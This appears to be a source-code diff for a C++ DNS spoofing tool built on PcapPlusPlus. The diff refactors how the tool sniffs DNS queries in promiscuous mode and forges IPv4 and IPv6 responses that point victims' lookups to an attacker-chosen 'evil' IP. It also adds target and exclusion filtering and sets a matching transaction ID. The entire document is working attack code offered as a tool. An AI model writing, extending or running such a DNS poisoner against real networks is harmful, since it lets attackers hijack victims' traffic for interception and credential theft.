@@ -6,6 +6,7 @@
 #include <UdpLayer.h>
 #include <TcpLayer.h>
 #include <PcapFilter.h>
+#include <PcapLiveDevice.h>
 
 #include <chrono>
 #include <thread>
@@ -50,75 +51,155 @@ void Program::Run()
 void Program::OnPacketCapture(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *dev, void *cookie)
 {
     pcpp::Packet parsedPacket(packet);
+    pcpp::EthLayer *eth = parsedPacket.getLayerOfType<pcpp::EthLayer>();
 
-    pcpp::Packet poisonedPacket(packet);
-
-    pcpp::IPv4Layer *ipV4Layer = poisonedPacket.getLayerOfType<pcpp::IPv4Layer>();
     bool wasPoisoned = false;
-    if (ipV4Layer)
+    if (eth)
     {
-        if (args.targets.hasTargets)
+        pcpp::IPv4Layer *ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
+        if (ipLayer) // Ipv4
         {
-            if (std::find(args.targets.V4.begin(), args.targets.V4.end(), ipV4Layer->getSrcIPv4Address()) == args.targets.V4.end())
-                return;
-        }
-        else if (args.targets.hasExclusions)
-        {
-            if (std::find(args.targets.exclusionsV4.begin(), args.targets.exclusionsV4.end(), ipV4Layer->getSrcIPv4Address()) != args.targets.exclusionsV4.end())
-                return;
-        }
 
-        wasPoisoned = PoisonPacket(parsedPacket, poisonedPacket, true);
+            switch (ipLayer->getIPv4Header()->protocol)
+            {
+            case pcpp::IPProtocolTypes::PACKETPP_IPPROTO_UDP:
+            {
+                pcpp::UdpLayer *udpLayer = parsedPacket.getLayerOfType<pcpp::UdpLayer>();
+                pcpp::DnsLayer *dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();
+
+                pcpp::DnsLayer poisonDns;
+                wasPoisoned = Program::PoisonDns(*dnsLayer, poisonDns);
+
+                if (!wasPoisoned)
+                    return;
+
+                pcpp::EthLayer poisonEth(eth->getDestMac(), eth->getSourceMac());
+                pcpp::IPv4Layer poisonIp(ipLayer->getDstIPv4Address(), ipLayer->getSrcIPv4Address());
+                poisonIp.getIPv4Header()->timeToLive = 64;
+                pcpp::UdpLayer poisonUdp(udpLayer->getDstPort(), udpLayer->getSrcPort());
+
+                pcpp::Packet poison;
+                poison.addLayer(&poisonEth);
+                poison.addLayer(&poisonIp);
+                poison.addLayer(&poisonUdp);
+                poison.addLayer(&poisonDns);
+
+                poison.computeCalculateFields();
+                
+                dev->sendPacket(&poison);
+
+                break;
+            }
+            case pcpp::IPProtocolTypes::PACKETPP_IPPROTO_TCP:
+            {
+                pcpp::TcpLayer *tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();
+                pcpp::DnsLayer *dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();
+
+                pcpp::DnsLayer poisonDns;
+                wasPoisoned = Program::PoisonDns(*dnsLayer, poisonDns);
+
+                if (!wasPoisoned)
+                    return;
+
+                pcpp::EthLayer poisonEth(eth->getDestMac(), eth->getSourceMac());
+                pcpp::IPv4Layer poisonIp(ipLayer->getDstIPv4Address(), ipLayer->getSrcIPv4Address());
+                poisonIp.getIPv4Header()->timeToLive = 64;
+                pcpp::TcpLayer poisonTcp(tcpLayer->getDstPort(), tcpLayer->getSrcPort());
+
+                pcpp::Packet poison;
+                poison.addLayer(&poisonEth);
+                poison.addLayer(&poisonIp);
+                poison.addLayer(&poisonTcp);
+                poison.addLayer(&poisonDns);
+
+                poison.computeCalculateFields();
+                dev->sendPacket(&poison);
+
+                break;
+            }
+            default:
+                return;
+            }
+        }
+        else // IPv6
+        {
+            pcpp::IPv6Layer *ipLayer = parsedPacket.getLayerOfType<pcpp::IPv6Layer>();
+            switch (ipLayer->getIPv6Header()->nextHeader)
+            {
+            case pcpp::IPProtocolTypes::PACKETPP_IPPROTO_UDP:
+            {
+                pcpp::UdpLayer *udpLayer = parsedPacket.getLayerOfType<pcpp::UdpLayer>();
+                pcpp::DnsLayer *dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();
+
+                pcpp::DnsLayer poisonDns(*dnsLayer);
+                wasPoisoned = Program::PoisonDns(*dnsLayer, poisonDns);
+
+                if (!wasPoisoned)
+                    return;
+
+                pcpp::EthLayer poisonEth(eth->getDestMac(), eth->getSourceMac());
+                pcpp::IPv6Layer poisonIp(ipLayer->getDstIPv6Address(), ipLayer->getSrcIPv6Address());
+                poisonIp.getIPv6Header()->hopLimit = 64;
+                pcpp::UdpLayer poisonUdp(udpLayer->getDstPort(), udpLayer->getSrcPort());
+
+                pcpp::Packet poison;
+                poison.addLayer(&poisonEth);
+                poison.addLayer(&poisonIp);
+                poison.addLayer(&poisonUdp);
+                poison.addLayer(&poisonDns);
+
+                poison.computeCalculateFields();
+                dev->sendPacket(&poison);
+
+                break;
+            }
+            case pcpp::IPProtocolTypes::PACKETPP_IPPROTO_TCP:
+            {
+                pcpp::TcpLayer *tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();
+                pcpp::DnsLayer *dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();
+
+                pcpp::DnsLayer poisonDns;
+                wasPoisoned = Program::PoisonDns(*dnsLayer, poisonDns);
+
+                if (!wasPoisoned)
+                    return;
+
+                pcpp::EthLayer poisonEth(eth->getDestMac(), eth->getSourceMac());
+                pcpp::IPv6Layer poisonIp(ipLayer->getDstIPv6Address(), ipLayer->getSrcIPv6Address());
+                poisonIp.getIPv6Header()->hopLimit = 64;
+                pcpp::TcpLayer poisonTcp(tcpLayer->getDstPort(), tcpLayer->getSrcPort());
+
+                pcpp::Packet poison;
+                poison.addLayer(&poisonEth);
+                poison.addLayer(&poisonIp);
+                poison.addLayer(&poisonTcp);
+                poison.addLayer(&poisonDns);
+
+                poison.computeCalculateFields();
+                
+                dev->sendPacket(&poison);
+
+                break;
+            }
+            default:
+                return;
+            }
+        }
     }
-    else
-    {
-        pcpp::IPv6Layer *ipV6Layer = poisonedPacket.getLayerOfType<pcpp::IPv6Layer>();
-        if (!ipV6Layer)
-            return;
 
-        if (args.targets.hasTargets)
-        {
-            if (std::find(args.targets.V6.begin(), args.targets.V6.end(), ipV6Layer->getSrcIPv6Address()) == args.targets.V6.end())
-                return;
-        }
-        else if (args.targets.hasExclusions)
-        {
-            if (std::find(args.targets.exclusionsV6.begin(), args.targets.exclusionsV6.end(), ipV6Layer->getSrcIPv6Address()) != args.targets.exclusionsV6.end())
-                return;
-        }
-
-        wasPoisoned = PoisonPacket(parsedPacket, poisonedPacket, true);
-    }
-
-    if (wasPoisoned)
-    {
-        if (!dev->sendPacket(&poisonedPacket))
-        {
-            Screen::SetColour(Screen::ForegroundColour::Red);
-            std::cerr << "Failed to send poisoned packet." << std::endl;
-            Screen::Reset();
-            return;
-        }
-
-        Screen::SetColour(Screen::ForegroundColour::Green);
-        std::cout << "Poisoned response sent." << std::endl;
-        Screen::Reset();
-    }
+    Screen::SetColour(Screen::ForegroundColour::Green);
+    std::cout << "Poisoned response sent." << std::endl;
+    Screen::Reset();
 
     return;
 }
 
-bool Program::PoisonPacket(const pcpp::Packet &original, pcpp::Packet &packet, bool isIPv4)
+bool Program::PoisonDns(const pcpp::DnsLayer &originalDns, pcpp::DnsLayer &poisonDns)
 {
-    pcpp::DnsLayer *originalDns = original.getLayerOfType<pcpp::DnsLayer>();
-    if (!originalDns || originalDns->getDnsHeader()->numberOfAnswers != 0 || originalDns->getDnsHeader()->numberOfAuthority != 0 || originalDns->getDnsHeader()->numberOfAdditional != 0)
-    { // the packet isn't a DNS one or is a retransmission / response packet)
-        return false;
-    }
-
-    pcpp::DnsLayer *poisonDns = packet.getLayerOfType<pcpp::DnsLayer>();
-
-    pcpp::DnsQuery *query = originalDns->getFirstQuery();
+    if(originalDns.getDnsHeader()->queryOrResponse == 1) // No need to respond to responses
+      return false;
+    
+    pcpp::DnsQuery *query = originalDns.getFirstQuery();
     while (query != nullptr)
     {
         switch (query->getDnsType())
@@ -131,15 +212,16 @@ bool Program::PoisonPacket(const pcpp::Packet &original, pcpp::Packet &packet, b
                 if (std::find(args.domains.begin(), args.domains.end(), query->getName()) != args.domains.end())
                 {
                     pcpp::IPv4DnsResourceData poisonedData(args.evilIPv4);
-                    // poisonDns.addQuery(query);
-                    poisonDns->addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
+                    poisonDns.addQuery(query);
+                    poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
                 }
             }
             else
             {
                 pcpp::IPv4DnsResourceData poisonedData(args.evilIPv4);
-                // poisonDns.addQuery(query);
-                poisonDns->addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
+                poisonDns.addQuery(query);
+                poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
+
             }
             break;
         }
@@ -153,15 +235,15 @@ bool Program::PoisonPacket(const pcpp::Packet &original, pcpp::Packet &packet, b
                 if (std::find(args.domains.begin(), args.domains.end(), query->getName()) != args.domains.end())
                 {
                     pcpp::IPv6DnsResourceData poisonedData(args.evilIPv6);
-                    // poisonDns.addQuery(query);
-                    poisonDns->addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
+                    poisonDns.addQuery(query);
+                    poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
                 }
             }
             else
             {
                 pcpp::IPv6DnsResourceData poisonedData(args.evilIPv6);
-                // poisonDns.addQuery(query);
-                poisonDns->addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
+                poisonDns.addQuery(query);
+                poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
             }
             break;
         }
@@ -169,59 +251,22 @@ bool Program::PoisonPacket(const pcpp::Packet &original, pcpp::Packet &packet, b
             break;
         }
 
-        query = originalDns->getNextQuery(query);
+        query = originalDns.getNextQuery(query);
     }
 
     // If no queries were poisoned due to domain name restrictions, return none
-    if (poisonDns->getAnswerCount() == 0)
+    if (poisonDns.getAnswerCount() == 0)
     {
         return false;
     }
 
-    // Poison Eth layer
-    pcpp::EthLayer *poisonEth = packet.getLayerOfType<pcpp::EthLayer>();
-    auto oldSourceMac = poisonEth->getSourceMac();
-    poisonEth->setSourceMac(poisonEth->getDestMac());
-    poisonEth->setDestMac(oldSourceMac);
-
-    // Poison IP layer
-
-    if (isIPv4)
-    {
-        pcpp::IPv4Layer *poisonIP = packet.getLayerOfType<pcpp::IPv4Layer>();
-
-        auto oldSource = poisonIP->getSrcIPv4Address();
-        poisonIP->setSrcIPv4Address(poisonIP->getDstIPv4Address());
-        poisonIP->setDstIPv4Address(oldSource);
-    }
-    else
-    {
-        pcpp::IPv6Layer *poisonIP = packet.getLayerOfType<pcpp::IPv6Layer>();
-
-        auto oldSource = poisonIP->getSrcIPv6Address();
-        poisonIP->setSrcIPv6Address(poisonIP->getDstIPv6Address());
-        poisonIP->setDstIPv6Address(oldSource);
-    }
-
-    // Poison Transport layer
-    pcpp::UdpLayer *poisonUdp = packet.getLayerOfType<pcpp::UdpLayer>();
-    if (poisonUdp)
-    {
-        std::swap(poisonUdp->getUdpHeader()->portSrc, poisonUdp->getUdpHeader()->portDst);
-        poisonUdp->calculateChecksum(true);
-    }
-    else
-    {
-        pcpp::TcpLayer *poisonTcp = packet.getLayerOfType<pcpp::TcpLayer>();
-        std::swap(poisonTcp->getTcpHeader()->portDst, poisonTcp->getTcpHeader()->portDst);
-        poisonTcp->calculateChecksum(true);
-    }
-
     // Finish DNS poisoning
-    //poisonDns->getDnsHeader()->transactionID = originalDns->getDnsHeader()->transactionID;
-    poisonDns->getDnsHeader()->queryOrResponse = 1;
+    poisonDns.getDnsHeader()->transactionID = originalDns.getDnsHeader()->transactionID;
+    poisonDns.getDnsHeader()->recursionAvailable = 1; // Because why not
+    poisonDns.getDnsHeader()->recursionDesired = originalDns.getDnsHeader()->recursionDesired;
+    // poisonDns->getDnsHeader()->authenticData = 1;
+    poisonDns.getDnsHeader()->queryOrResponse = 1;
 
-    packet.computeCalculateFields();
     return true;
 }
 
@@ -231,9 +276,9 @@ void Program::ParseArguments(int argc, char *argv[])
     parser.add_argument("-i", "--interface").required().help("Network interface to use");
     parser.add_argument("-b", "--bad-ip").required().help("IPv4 Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
     parser.add_argument("-e", "--bad-ipv6").help("IPv6 Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
-    parser.add_argument("--ttl").default_value<uint32_t>(5).help("The time-to-live of the poisoned DNS record (specified in seconds)").scan<'u', uint32_t>();
+    parser.add_argument("--ttl").default_value<uint32_t>(62).help("The time-to-live of the poisoned DNS record (specified in seconds)").scan<'u', uint32_t>();
     parser.add_argument("-d", "--domains").help("A comma-separated list, without whitespace, of specific domains to poison. By default deserted will poison all domains.");
-    parser.add_argument("-p", "--port").help("The possible destination ports of outbound DNS queries [defualt: 53, 5353]");
+    parser.add_argument("-p", "--ports").nargs(argparse::nargs_pattern::any).default_value(std::vector<uint16_t>{53, 5353}).help("The possible destination ports of outbound DNS queries [defualt: 53, 5353]").scan<'i', uint16_t>();
 
     std::vector<std::string> errors;
     try
@@ -274,7 +319,7 @@ void Program::ParseArguments(int argc, char *argv[])
 
             for (const auto &t : targets)
             {
-                if (t[0] == '!')
+                if (t[0] == '~')
                 {
                     pcpp::IPv4Address IPv4(t.substr(1));
                     if (IPv4.isValid())
@@ -339,6 +384,7 @@ void Program::ParseArguments(int argc, char *argv[])
         }
 
         // Parse ports
+        args.ports = parser.get<std::vector<uint16_t>>("--ports");
 
         if (errors.size() != 0)
         {
@@ -361,7 +407,8 @@ void Program::ParseArguments(int argc, char *argv[])
 
 void Program::InitCaptureInterface()
 {
-    if (!interface.dev->open())
+    pcpp::PcapLiveDevice::DeviceConfiguration config(pcpp::PcapLiveDevice::DeviceMode::Promiscuous);
+    if (!interface.dev->open(config))
     {
         Screen::SetColour(Screen::ForegroundColour::Red);
         std::cerr << "Failed to open interface." << std::endl;
@@ -369,33 +416,83 @@ void Program::InitCaptureInterface()
         exit(0);
     }
 
-    // Setup the filters
-    std::vector<pcpp::PortFilter> portFilters;
-
-    pcpp::PortFilter p53(53, pcpp::Direction::DST);
-    pcpp::PortFilter p5353(5353, pcpp::Direction::DST);
-    pcpp::OrFilter portFilter;
-    portFilter.addFilter(&p53);
-    portFilter.addFilter(&p5353);
-
-    /*for (auto p : args.ports)
+    // Compile filter
+    std::string filter = "(";
+    // Add ports to filter
+    for (size_t i = 0; i < args.ports.size(); ++i)
     {
-        portFilters.emplace_back(p, pcpp::Direction::DST);
-        portFilter.addFilter(&(portFilters[portFilters.size() - 1]));
-    }*/
+        if (i != args.ports.size() - 1)
+        {
+            filter.append("dst port " + std::to_string(args.ports[i]) + " or ");
+            continue;
+        }
 
-    pcpp::ProtoFilter udpFilter(pcpp::UDP);
-    pcpp::ProtoFilter tcpFilter(pcpp::TCP);
+        filter.append("dst port " + std::to_string(args.ports[i]) + ") ");
+    }
 
-    pcpp::OrFilter protoFilter;
-    protoFilter.addFilter(&udpFilter);
-    protoFilter.addFilter(&tcpFilter);
+    // Add targets/exclusions to filter
+    if (args.targets.hasTargets)
+    {
+        filter.append("and (");
+        for (size_t i = 0; i < args.targets.V4.size(); ++i)
+        {
+            if (i != args.targets.V4.size() - 1)
+            {
+                filter.append("src host " + args.targets.V4[i].toString() + " or ");
+                continue;
+            }
 
-    pcpp::AndFilter finalFilter;
-    finalFilter.addFilter(&portFilter);
-    finalFilter.addFilter(&protoFilter);
+            filter.append("src host " + args.targets.V4[i].toString() + ") ");
+        }
 
-    if (!interface.dev->setFilter(finalFilter))
+        if (args.targets.V4.size() != 0 && args.targets.exclusionsV6.size() != 0)
+        {
+            filter.append("or (");
+        }
+        else if (args.targets.V4.size() == 0 && args.targets.exclusionsV6.size() != 0)
+        {
+            filter.append("and (");
+        }
+        for (size_t i = 0; i < args.targets.V6.size(); ++i)
+        {
+            if (i != args.targets.V6.size() - 1)
+            {
+                filter.append("src host " + args.targets.V6[i].toString() + " or ");
+                continue;
+            }
+
+            filter.append("src host " + args.targets.V6[i].toString() + ") ");
+        }
+    }
+    else if (args.targets.hasExclusions)
+    {
+        filter.append("and (");
+        for (size_t i = 0; i < args.targets.exclusionsV4.size(); ++i)
+        {
+            if (i != args.targets.exclusionsV4.size() - 1)
+            {
+                filter.append("not src host " + args.targets.exclusionsV4[i].toString() + " and ");
+                continue;
+            }
+
+            filter.append("not src host " + args.targets.exclusionsV4[i].toString() + ") ");
+        }
+
+        if (args.targets.exclusionsV6.size() != 0)
+            filter.append("and (");
+        for (size_t i = 0; i < args.targets.exclusionsV6.size(); ++i)
+        {
+            if (i != args.targets.exclusionsV6.size() - 1)
+            {
+                filter.append("not src host " + args.targets.exclusionsV6[i].toString() + " and ");
+                continue;
+            }
+
+            filter.append("not src host " + args.targets.exclusionsV6[i].toString() + ") ");
+        }
+    }
+
+    if (!interface.dev->setFilter(filter))
     {
         Screen::SetColour(Screen::ForegroundColour::Red);
         std::cerr << "Failed to setup capture filters." << std::endl;
@@ -403,4 +500,5 @@ void Program::InitCaptureInterface()
 
         exit(0);
     }
+
 }
